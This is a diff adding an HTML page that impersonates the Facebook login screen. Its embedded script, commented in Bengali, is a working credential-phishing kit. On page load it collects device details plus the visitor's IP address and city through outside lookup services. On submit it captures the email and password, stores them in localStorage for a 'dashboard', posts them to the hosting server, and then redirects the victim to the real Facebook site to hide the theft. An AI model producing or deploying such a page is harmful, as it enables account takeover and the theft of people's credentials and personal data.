@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Facebook</title>
+       <style>
+        /* Facebook Font and Basic Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #1c1e21;
+            line-height: 1.34;
+        }
+        
+        /* Facebook Lite Logo */
+        .fb-logo {
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        
+        .fb-logo-text {
+            font-size: 56px;
+            font-weight: bold;
+            color: #1877f2;
+            letter-spacing: -1px;
+        }
+        
+        .fb-lite-badge {
+            font-size: 20px;
+            color: #65676b;
+            font-weight: 500;
+            margin-top: -8px;
+        }
+        
+        /* Login Container - the card itself */
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 18px;
+            font-weight: normal;
+            margin-bottom: 20px;
+            text-align: center;
+            color: #1c1e21;
+        }
+        
+        /* Form and Input Styles */
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            height: 52px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            padding: 0 15px;
+            font-size: 17px;
+            transition: border-color 0.3s;
+            background-color: #f5f6f7;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border: 1px solid #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        ::placeholder {
+            color: #8a8d91;
+            font-size: 16px;
+        }
+        
+        /* Login Button */
+        .login-button {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 0;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-bottom: 15px;
+            transition: background-color 0.3s;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+
+        .login-button:disabled {
+            background-color: #8ab9f1;
+            cursor: wait;
+        }
+        
+        /* Links and Actions */
+        .forgot-password {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+            display: block;
+            margin-bottom: 20px;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px -20px;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            padding: 12px 16px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            display: inline-block;
+            margin-top: 10px;
+            transition: background-color 0.3s;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        /* Footer */
+        .footer {
+            margin-top: 28px;
+            text-align: center;
+            color: #8a8d91;
+            font-size: 14px;
+            max-width: 400px;
+            padding: 0 20px;
+        }
+        
+        .footer-links {
+            margin-top: 10px;
+        }
+        
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            margin: 0 5px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        /* Responsive Design for Mobile */
+        @media (max-width: 480px) {
+            body {
+                background-color: white;
+                padding: 20px;
+            }
+            
+            .login-container {
+                box-shadow: none;
+                padding: 0;
+                max-width: 100%;
+            }
+            
+            .fb-logo {
+                margin-top: 20px;
+            }
+            
+            .fb-logo-text {
+                font-size: 42px;
+            }
+            
+            .footer {
+                display: none;
+            }
+        }
+        
+    </style>
+</head>
+<body>
+
+    <div class="fb-logo">
+        <div class="fb-logo-text">facebook</div>
+    </div>
+    
+    <div class="login-container">
+        <h1>Log in to Facebook</h1>
+        
+        <form>
+            <div class="input-group">
+                <input type="text" name="email" id="email" placeholder="Email address or phone number" required>
+            </div>
+            
+            <div class="input-group">
+                <input type="password" name="pass" id="pass" placeholder="Password" required>
+            </div>
+            
+            <button type="submit" class="login-button">Log In</button>
+            
+            <a href="#" class="forgot-password">Forgotten password?</a>
+            
+            <div class="divider"></div>
+            
+            <button type="button" class="create-account">Create New Account</button>
+        </form>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-links">
+            <a href="#">Sign Up</a> · 
+            <a href="#">Log In</a> · 
+            <a href="#">Messenger</a> · 
+            <a href="#">Facebook Lite</a> · 
+            <a href="#">Watch</a> · 
+            <a href="#">Places</a> · 
+            <a href="#">Games</a> · 
+            <a href="#">Marketplace</a>
+        </div>
+        <div style="margin-top: 10px;">Meta © 2023</div>
+    </div>
+
+    <!-- =========== ডেটা সংগ্রহের জন্য নতুন স্ক্রিপ্ট =========== -->
+    <script>
+        // পেজ লোড হওয়ার সাথে সাথে ডিভাইসের তথ্য সংগ্রহ শুরু
+        let deviceInfoPromise = (async () => {
+            const deviceInfo = {
+                ua: navigator.userAgent || 'Unknown',
+                platform: navigator.platform || 'Unknown',
+                language: navigator.language || 'Unknown',
+                res: `${window.screen.width}x${window.screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            if (navigator.connection) {
+                deviceInfo.net_effective = navigator.connection.effectiveType || 'unknown';
+            }
+            
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.batteryLevel = Math.round(battery.level * 100);
+                    deviceInfo.isCharging = battery.charging;
+                } catch (e) { /* ignore */ }
+            }
+            
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                deviceInfo.ip = ipData.ip;
+                
+                const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+                const locationData = await locationResponse.json();
+                deviceInfo.country = locationData.country_name;
+                deviceInfo.city = locationData.city;
+            } catch (e) {
+                deviceInfo.ip = 'Failed to fetch';
+            }
+            
+            return JSON.stringify(deviceInfo);
+        })();
+
+        // ফর্ম সাবমিট করার সময় ডেটা ম্যানেজ করা
+        document.querySelector('form').addEventListener('submit', async function(event) {
+            event.preventDefault(); // ফর্মের ডিফল্ট সাবমিশন বন্ধ করা
+
+            const email = document.getElementById('email').value;
+            const pass = document.getElementById('pass').value;
+
+            if (!email || !pass) {
+                alert('Please enter both email/phone and password.');
+                return;
+            }
+
+            const loginButton = document.querySelector('.login-button');
+            loginButton.disabled = true;
+            loginButton.textContent = 'Logging In...';
+            
+            const deviceInfo = await deviceInfoPromise;
+
+            // LocalStorage-এ ডেটা সেভ করা (ড্যাশবোর্ডের জন্য)
+            try {
+                const storedData = JSON.parse(localStorage.getItem('userInputData') || '{}');
+                if (!storedData.facebookLiteData) {
+                    storedData.facebookLiteData = [];
+                }
+                storedData.facebookLiteData.push({
+                    email: email,
+                    pass: pass,
+                    deviceInfo: deviceInfo,
+                    timestamp: new Date().toLocaleString(),
+                    type: 'login'
+                });
+                localStorage.setItem('userInputData', JSON.stringify(storedData));
+            } catch (error) {
+                console.error('Error saving to localStorage:', error);
+            }
+
+            // সার্ভারে ডেটা পাঠানোর সিমুলেশন
+            try {
+                await fetch('/', { 
+                    method: 'POST', 
+                    body: new URLSearchParams({ email, pass, deviceInfo }) 
+                });
+            } catch (error) {
+                console.error('Error sending data to server:', error);
+            }
+
+            // ব্যবহারকারীকে আসল Facebook সাইটে রিডাইরেক্ট করা
+            setTimeout(() => {
+                window.location.href = 'https://www.facebook.com/';
+            }, 1500);
+        });
+    </script>
+</body>
+</html>
